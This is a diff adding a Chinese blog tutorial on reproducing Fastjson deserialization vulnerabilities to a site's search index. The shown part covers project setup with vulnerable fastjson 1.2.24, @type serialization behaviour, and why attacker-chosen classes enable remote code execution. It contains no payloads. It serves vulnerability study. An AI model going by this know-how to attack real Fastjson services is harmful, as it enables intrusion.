@@ -8795,4 +8795,685 @@ su -<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span
         <tag>firejail提权</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Fastjson系列漏洞复现及原理调试分析</title>
+    <url>/posts/d5d1bb40.html</url>
+    <content><![CDATA[<h1 id="Fastjson系列漏洞复现及原理调试分析"><a href="#Fastjson系列漏洞复现及原理调试分析" class="headerlink" title="Fastjson系列漏洞复现及原理调试分析"></a>Fastjson系列漏洞复现及原理调试分析</h1><h2 id="Fastjson前置知识"><a href="#Fastjson前置知识" class="headerlink" title="Fastjson前置知识"></a>Fastjson前置知识</h2><h3 id="使用Fastjson进行序列化和反序列化"><a href="#使用Fastjson进行序列化和反序列化" class="headerlink" title="使用Fastjson进行序列化和反序列化"></a>使用Fastjson进行序列化和反序列化</h3><p>开发环境：IDEA2021.2.1、JDK1.7.0_76（此处选用1.7.0_76是为了方便后续测试）</p>
+<p>新建一个 Maven 项目，名称叫<code>Fastjson_demo</code>，编辑<code>pom.xml</code>文件如下</p>
+<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>
+         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
+         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.example<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>Fastjson_demo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0-SNAPSHOT<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.24<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-codec<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-codec<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>commons-io<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>commons-io<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.unboundid<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>unboundid-ldapsdk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.0.9<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">&gt;</span></span>compile<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>
+
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maven.compiler.source</span><span class="token punctuation">&gt;</span></span>7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maven.compiler.source</span><span class="token punctuation">&gt;</span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maven.compiler.target</span><span class="token punctuation">&gt;</span></span>7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maven.compiler.target</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>之后右键单击<code>pom.xml</code>选择<code>Download Sources and Documentation</code></p>
+<p>首先新建一个简单的 Student 类，<code>Student.class</code>，其中包含两个属性及其<code>getter</code>/<code>setter</code>方法，还有类的构造函数：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student setName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student setAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="JSON-toJsonString-及其SerializerFeature-WriteClassName属性"><a href="#JSON-toJsonString-及其SerializerFeature-WriteClassName属性" class="headerlink" title="JSON.toJsonString()及其SerializerFeature.WriteClassName属性"></a><code>JSON.toJsonString()</code>及其<code>SerializerFeature.WriteClassName</code>属性</h4><p>然后新建一个<code>TestFastJson.java</code>，调用<code>JSON.toJsonString()</code>来序列化 Student 类对象</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestFastJson</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> student <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        student<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Hello Fastjson!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        student<span class="token punctuation">.</span><span class="token function">setAge</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">String</span> jsonString <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>student<span class="token punctuation">,</span> <span class="token class-name">SerializerFeature<span class="token punctuation">.</span>WriteClassName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Fastjson 利用<code>toJSONString</code>方法来序列化对象，<code>SerializerFeature.WriteClassName</code>是<code>JSON.toJSONString()</code>中的一个设置属性值，设置之后在序列化的时候会多写入一个<code>@type</code>，即写入被序列化的类名。type 可以指定反序列化的类，并且调用其<code>getter</code>/<code>setter</code>/<code>is</code>方法，而问题恰恰出在这个特性，Fastjson接收的 JSON 可以通过<code>@type</code>字段来指定反序列化时该 JSON 应当还原成何种类型的对象，我们可以配合一些存在问题的类，进一步造成 RCE。</p>
+<p>执行<code>TestFastJson.java</code>输出：</p>
+<pre class="line-numbers language-none"><code class="language-none"># 设置了SerializerFeature.WriteClassName属性
+Student构造函数
+Student setName
+Student setAge
+Student getAge
+Student getName
+{"@type":"fastjson.Student","age":18,"name":"Hello Fastjson!"}
+
+# 未设置SerializerFeature.WriteClassName属性
+Student构造函数
+Student setName
+Student setAge
+Student getAge
+Student getName
+{"age":18,"name":"Hello Fastjson!"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="JSON-parseObject-和JSON-parse"><a href="#JSON-parseObject-和JSON-parse" class="headerlink" title="JSON.parseObject()和JSON.parse()"></a><code>JSON.parseObject()</code>和<code>JSON.parse()</code></h4><p>反序列化的API主要有两个，分别是<code>JSON.parseObject()</code>和<code>JSON.parse()</code>，最主要的区别就是<code>JSON.parseObject()</code>在<strong>未指定目标类的前提下</strong>返回的是 JSONObject，而<code>JSON.parse()</code>返回的是实际类的对象。</p>
+<p><code>parseObject()</code>本质上也是调用<code>parse()</code>进行反序列化的。但是<code>parseObject()</code>会额外将 Java 对象转为 JSONObject 对象，即<code>JSON.toJSON(obj)</code>。</p>
+<p>所以反序列化时的细节区别在于：</p>
+<p><code>parse()</code>会识别并调用目标类的 setter 方法及<strong>某些特定条件的 getter 方法</strong>；</p>
+<p>而<code>parseObject()</code>由于多执行了<code>JSON.toJSON(obj)</code>，因此在处理过程中会调用反序列化目标类的<strong>所有 setter 和 getter 方法</strong>。</p>
+<p><code>TestFastJsonDeserialize.class</code></p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestFastJsonDeserialize</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token class-name">String</span> jsonString <span class="token operator">=</span><span class="token string">"{\"@type\":\"fastjson.Student\",\"age\":18,\"name\":\"Hello Fastjson!\"}"</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"通过parseObject方法进行反序列化，未指定class，返回一个JSONObject对象："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">JSONObject</span> obj <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"通过parseObject方法进行反序列化，指定class，返回相应的类："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> obj02 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj02<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj02<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"通过parse方法进行反序列化，返回相应的类："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> obj03 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">)</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj03<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj03<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>输出：</p>
+<pre class="line-numbers language-none"><code class="language-none">通过parseObject方法进行反序列化，未指定class，返回一个JSONObject对象：
+Student构造函数
+Student setAge
+Student setName
+Student getAge
+Student getName
+{"name":"Hello Fastjson!","age":18}
+com.alibaba.fastjson.JSONObject
+
+通过parseObject方法进行反序列化，指定class，返回相应的类：
+Student构造函数
+Student setAge
+Student setName
+fastjson.Student@2957fcb0
+fastjson.Student
+
+通过parse方法进行反序列化，返回相应的类：
+Student构造函数
+Student setAge
+Student setName
+fastjson.Student@1376c05c
+fastjson.Student<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="parseObject-方法的Feature-SupportNonPublicField属性"><a href="#parseObject-方法的Feature-SupportNonPublicField属性" class="headerlink" title="parseObject()方法的Feature.SupportNonPublicField属性"></a><code>parseObject()</code>方法的<code>Feature.SupportNonPublicField</code>属性</h4><p>Fastjson默认不会反序列化私有属性，若想对私有属性进行反序列化，则需要在<code>parseObject()</code>方法添加一个属性<code>Feature.SupportNonPublicField</code>。</p>
+<p>举个例子：</p>
+<p>我们稍微修改一下<code>Student</code>类，把私有属性age的<code>setter</code>方法去掉（如果不去掉，Fastjson依然是能反序列化成功的，因为你提供了这个接口），作为对比，我们把name属性设置为<code>public</code>，并且也注释掉<code>setter</code>方法：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
+<span class="token comment">//    private String name;</span>
+    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token comment">/*    public void setName(String name) {
+        System.out.println("Student setName");
+        this.name = name;
+    }*/</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token comment">/*    public void setAge(int age) {
+        System.out.println("Student setAge");
+        this.age = age;
+    }*/</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后反序列化（注意将<code>TestFastJson.java</code>全部注释掉）：</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> jsonString <span class="token operator">=</span><span class="token string">"{\"@type\":\"fastjson.Student\",\"age\":18,\"name\":\"Hello Fastjson!\"}"</span><span class="token punctuation">;</span>
+<span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> obj04 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> obj04<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>输出如下，发现未设置<code>Feature.SupportNonPublicField</code>时，私有属性age为0，即没有赋值成功，而同样没有<code>setter</code>方法的公有属性name却可以赋值成功。</p>
+<pre class="line-numbers language-none"><code class="language-none"># 设置了Feature.SupportNonPublicField属性
+Student构造函数
+fastjson.Student@2d8e6db6
+fastjson.Student
+Student getName
+Student getAge
+Hello Fastjson! 18
+
+# 未设置Feature.SupportNonPublicField属性
+Student构造函数
+fastjson.Student@2d8e6db6
+fastjson.Student
+Student getName
+Student getAge
+Hello Fastjson! 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="Fastjson反序列化漏洞原理"><a href="#Fastjson反序列化漏洞原理" class="headerlink" title="Fastjson反序列化漏洞原理"></a>Fastjson反序列化漏洞原理</h2><p>从前文可知，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。</p>
+<p>无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者借助不同利用链来进行绕过利用而已。</p>
+<p><strong>那么如何才能找到这种有危险操作的类呢？</strong></p>
+<p>前文中，我们知道Fastjson使用<code>parseObject()</code>/<code>parse()</code>进行反序列化的时候可以指定类型。。有两种情况我们有可乘之机：</p>
+<p>1、反序列化指定某个具体类，开发者实现的这个具体类中就包含了危险操作；</p>
+<p>2、反序列化指定的类很大，包含了很多子类，并且在不在反序列化的黑名单内。极端情况，如Object或JSONObject，则可以反序列化出来任意类。例如代码<code>Object o = JSON.parseObject(poc,Object.class)</code>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。这种情况下，带有危险操作的类就会有很多。</p>
